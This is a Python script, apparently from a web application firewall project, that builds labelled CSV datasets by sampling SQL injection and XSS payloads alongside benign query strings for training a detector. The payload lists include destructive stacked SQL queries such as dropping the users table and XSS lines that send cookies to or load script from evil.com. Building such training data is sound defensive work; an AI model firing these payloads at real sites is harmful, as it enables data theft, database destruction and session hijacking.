import random
import csv
import os

# ─── SQL Injection Payloads (متنوع‌تر) ─────────────────────────────────────
sql_payloads = [
    # Boolean-based
    "' OR 1=1 --",
    "' OR '1'='1",
    "' OR 'a'='a",
    "' OR 1=1#",
    "' OR ''='",
    "1 OR 1=1",
    "admin' --",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "' OR 1-- -",

    # Union-based
    "' UNION SELECT password FROM users --",
    "' UNION SELECT 1,2,3 --",
    "' UNION ALL SELECT username,password FROM users --",
    "1 UNION SELECT null,null --",
    "' UNION SELECT table_name FROM information_schema.tables --",
    "' UNION SELECT @@version --",
    "' UNION SELECT user(),database(),version() --",

    # Time-based
    "'; WAITFOR DELAY '0:0:5'--",
    "1; SLEEP(5)",
    "' AND SLEEP(5) --",
    "'; SELECT SLEEP(5)--",
    "1 AND BENCHMARK(5000000,MD5(1))--",

    # Error-based
    "' AND EXP(~(SELECT * FROM(SELECT 1)t))",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

    # Stacked Queries
    "'; DROP TABLE users --",
    "'; DELETE FROM orders --",
    "'; UPDATE users SET password='hacked'--",
    "'; INSERT INTO users VALUES('hacker','pass')--",

    # Encoded / Obfuscated
    "0x27 OR 0x313d31",
    "' OR 0x313d31--",
    "CHAR(39) OR 1=1--",
]

# ─── XSS Payloads (متنوع‌تر) ──────────────────────────────────────────────
xss_payloads = [
    # Script tags
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>document.location='http://evil.com?c='+document.cookie</script>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<script src='http://evil.com/xss.js'></script>",

    # Event handlers
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<body onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onchange=alert(1)><option>x</option></select>",
    "<video onloadstart=alert(1) src=x>",
    "<details ontoggle=alert(1) open>",

    # JavaScript protocol
    "<iframe src='javascript:alert(1)'>",
    "<a href='javascript:alert(1)'>click</a>",
    "<form action='javascript:alert(1)'><input type=submit>",

    # Encoded
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",

    # eval / document
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>",
]

# ─── Normal / Benign Payloads ───────────────────────────────────────────────
normal_payloads = [
    # درخواست‌های عادی کوتاه و Queryهای خالی برای جلوگیری از False Positive مدل
    "",
    "a=",
    "=b",
    "a=b",
    "x=1",
    "q=test",
    "page=1",
    "products id=42&category=electronics id=42 category=electronics",
    "search=running+shoes&category=sports&sort=price&order=asc",
    "filter=color:blue,size:large&category=clothing&page=2&limit=20",
    "user_id=1023&order_id=98123&status=shipped&tracking=yes",
    "category=books&subcategory=fiction&author=unknown&year=2023",
    # جستجو و فیلتر
    "search=book",
    "search=laptop",
    "query=python+programming",
    "keyword=machine+learning",
    "filter=price&sort=asc",
    "category=electronics",
    "category=clothing",
    "page=home",
    "page=2",
    "limit=10&offset=20",

    # پارامترهای معمول
    "product?id=25",
    "product?id=100",
    "item=42&qty=3",
    "user_id=15",
    "post_id=7",
    "order_id=1234",
    "ref=homepage",

    # احراز هویت معمول
    "username=ali",
    "username=sara123",
    "email=user@example.com",
    "name=John+Smith",
    "age=25",
    "city=Tehran",

    # صفحه‌بندی
    "sort=price",
    "sort=date&order=desc",
    "view=grid",
    "lang=fa",
    "theme=dark",
    "currency=USD",
]


def generate_csv(output_path, attack_list, normal_list, size=3000):
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["payload", "label"])

        for _ in range(size):
            writer.writerow([random.choice(attack_list), 1])

        for _ in range(size):
            writer.writerow([random.choice(normal_list), 0])


if __name__ == "__main__":
    # مسیر از ریشه پروژه (waf/)
    generate_csv("data/datasets/sql.csv", sql_payloads, normal_payloads, size=3000)
    generate_csv("data/datasets/xss.csv", xss_payloads, normal_payloads, size=3000)
    print("Datasets generated successfully.")
    print(f"  SQL: {len(sql_payloads)} unique attack templates → 3000 samples")
    print(f"  XSS: {len(xss_payloads)} unique attack templates → 3000 samples")
